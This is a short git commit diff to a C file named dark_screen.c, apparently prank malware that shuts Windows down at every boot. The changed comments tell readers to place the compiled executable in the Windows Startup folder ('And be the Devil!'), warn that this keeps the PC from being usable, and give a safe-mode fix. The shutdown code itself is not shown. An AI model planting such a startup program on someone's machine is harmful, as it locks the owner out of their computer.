131c35eec57df1462185484c6522d3bb034854c8
Minhas Kamal <minhaskamal024@gmail.com>
2024-04-07 14:07:57 -0500

    Simply shuts the system down.

--- dark_screen.c
+++ dark_screen.c
@@ -1,5 +1,10 @@
 // Simply shuts the system down. 
-// Put it in the startup directory (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup)
+// Put the compiled executable in the startup directory 
+// (%appdata%\Microsoft\Windows\Start Menu\Programs\Startup)
+// of WindowsOS. And be the Devil!
+// Caution: This will prevent you from turning the PC on. To
+// solve, you can turn on the PC in safe mode and remove the
+// executable from the startup directory.
 
 #include <stdlib.h>
 
